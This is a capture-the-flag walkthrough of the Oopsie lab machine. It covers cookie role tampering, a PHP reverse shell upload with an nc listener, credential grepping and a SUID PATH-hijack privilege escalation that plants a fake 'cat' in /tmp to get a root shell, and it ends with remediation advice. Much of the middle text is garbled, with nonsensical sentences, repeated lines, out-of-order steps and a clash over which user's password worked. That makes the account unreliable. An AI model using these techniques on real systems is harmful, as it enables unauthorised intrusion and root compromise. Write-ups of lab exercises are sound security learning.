# Oopsie | Machine | Very Easy | Linux

## Introduction
Let's start with reconnaissance.

```
nmap <IP> -sC -sV
```

Ports 80 (http) & 22 (ssh) are open. Starting with SSH is out of the question as to what the password could be, because I don't have any lead as to what the password could be.

So I tried visiting the website, & honestly there was nothing special.

## Web Proxying with Burp Suite
A web proxy in general is an intermediary server that sits between you & the internet. When you request goes to the proxy, your request first goes to the proxy first, who then sends the web page & IP form the server, effectively hiding your site you visit.

Burp Suite is the industry-standard platform used for web app security testing. It is essentially an interception proxy sitting between our web browser & the web server, allowing us to view, analyze & modify HTTP/S traffic in real time.

- Burp Suite uses port 8080 by default for its proxy listener.

So I tried disabling the interception of Burp & configuring the proxy of our browser to 127.0.0.1 on port 8080. I refreshed the page which mapped multiple directories in Burp. The most interesting one was `/cdn-cgi/login` which took me to a login page. There was a login page which seemed as the most viable option for now.

After navigating through the dashboard, I came across the directory holding uploads. I searched the endpoints holding pages which were blocked & the answer was privileges. The malicious cat in `/bin`? Since that's when the original is & the answer read in `/bin`.

A Web Crawler is a program, or automated script that browses the web methodologically through an upload page which was tigging to execute that we can deduce that the error, & if it doesn't shows an error. `find` tells find to search the entire filesystem starting from root `/`, & means any word after `pass` to look for & means case-sensitive. `passw*`: passw is what we want grep to look for & `*` means any word after passw would be `/uploads/` (it was) using the full path `/bin/cat`.

## Cookie Manipulation
A cookie is a text file with data created by the web server & stored by the browser into your computer to identify a session that sits between you & the intermediary server chat sits between you & the browser.

I noticed on top, the search bar had "user_id". I made it functional via python3 -c "import pty; pty.spawn('/bin/bash')"

I started my listener `nc -lvnp 1234` & immediately requested `http://<ip>/uploads/php-reverse-shell.php` & it worked.

I found for the cookies to check if they used a "role" & "value" which are manipulatable & it turns out they are! They use the "role" & "value" which are manipulatable & it turns out they are! They use the user id, after editing both, I decided to change it to look for password fields.

Now for the foothold, I tried uploading a PHP reverse shell.

For the use of that id, I tried looking into cookies to check if they used the id, after editing both, I decided the user id, & it turns out they are! I decided the upload option (`user=2` & `admin`).

Now it was time for lateral movement since I can't do anything as `www-data`.

I started enumerating the directories & I found `/var/www/html/cdn-cgi/login` & I decided to look for passwords used.

`cat *|passw` reads all files & `grep -i passw` pipes/feeds the output to whatever it finds it (`i` means case-insensitive so I used).

## Privilege Escalation
I got a password, `MEGACORP-4dm!n[all]`.

I checked available users by `cat /etc/passwd` & "robert" seemed cool.

I checked used `su robert` & it seemed cool.

Unfortunately, the password didn't work. So I started reading around & found that I found the user "will" gs4CO.rPUs3r" which worked, I found the chat like the user flag.

I next used `ls -la /usr/bin/bugtracker` & check privileges & type of file.

The result was a file called `/usr/bin/bugtracker`.

SUID (set owner User ID) is a special permission on a file with SUID always executes as the OWNER of the file, regardless of who executes the command.

`lc = s = file owner has execute permission`
`uc = S = no execute the command`

Draw to escalate our privileges we first need to know what we're allowed to do:

`sudo -l` = not allowed to run sudo.

The file I found had setuid & the file `id = shared us a group robert belongs to`

`called local (bugtracker)`

`find / -group bugtracker 2>/dev/null`

The tool tries to output a file using `cat`

`id`: shows `it doesn't shows an error`.

`find /usr/bin/bugtracker`

I ran the app `/usr/bin/bugtracker`

Sudo -l = not allowed to run sudo, & it doesn't allowed to run sudo.

owner is root :)

the file I found had setuid & the command execute permission

`1c = s = file owner has execute permission`
`uc = S = no execute the command`

## PATH Hijacking
So us (unprivileged) execute `./bugtracker` relying on `$PATH` variable to locate the `cat` file. So essentially, it will search `$PATH` not hard coded `/bin/cat`.

`cat` file

it calls `cat` file

bugtracker runs as root (SUID)

searches `$PATH` which has `/tmp:$PATH`

So by creating a "malicious cat" we can:

Finds our cat `/tmp/cat` instead. Executes as root & I get a root shell!

```
cd /tmp
echo "/bin/bash" > cat
chmod +x cat
export PATH=/tmp:$PATH
```

So I use it, & the file to be searched first.

& make tmp the first to be searched when the tool accesses `$PATH`

how bugtracker calls `cat`, it searches `/tmp` first

you might ask why didn't we create the malicious `cat` in `/bin`? since that's where the answer is & the privileges. the original is & the answer read in `/bin`.

You can't do anything but read in `/bin`.

### Summary of the full chain
1. Full port scan (`nmap -sC -sV`) → found ports 80 (http) & 22 (ssh) open
2. Set up Burp Suite as an intercepting proxy to map hidden directories, discovered `/cdn-cgi/login`
3. Found and manipulated the "role"/user_id cookie value to gain admin access to the dashboard
4. Located an upload feature and uploaded a PHP reverse shell to get a `www-data` shell
5. Upgraded the shell with `python3 -c "import pty; pty.spawn('/bin/bash')"`
6. Enumerated the web root and found credentials (`MEGACORP-4dm!n[all]`) inside bugtracker application files
7. Used the found credentials to switch to the user `robert` and grab the user flag
8. Found `/usr/bin/bugtracker` with the SUID bit set, owned by root
9. Discovered the binary calls `cat` without an absolute path, relying on `$PATH`
10. Hijacked `$PATH` by placing a malicious `cat` (spawning `/bin/bash`) in `/tmp` and prepending it to `$PATH`
11. Ran `bugtracker`, which executed the malicious `cat` as root → obtained a root shell and captured the root flag

## Remediation
- Never trust client-side values (cookies, hidden form fields) for authorization decisions — always validate role/permissions server-side.
- Enforce strict file type, extension, and content validation on upload features to prevent arbitrary file (e.g. PHP webshell) uploads.
- Store credentials securely (e.g. in a secrets manager or environment variables), never in plaintext files reachable through the web root.
- Never grant SUID permissions to binaries that call other executables without specifying an absolute path — always hardcode paths (e.g. `/bin/cat`) or explicitly sanitize `$PATH` within the program.
- Regularly audit SUID/SGID binaries on the system (`find / -perm -4000`) and remove unnecessary SUID bits.

## What I Learned
-
-
-
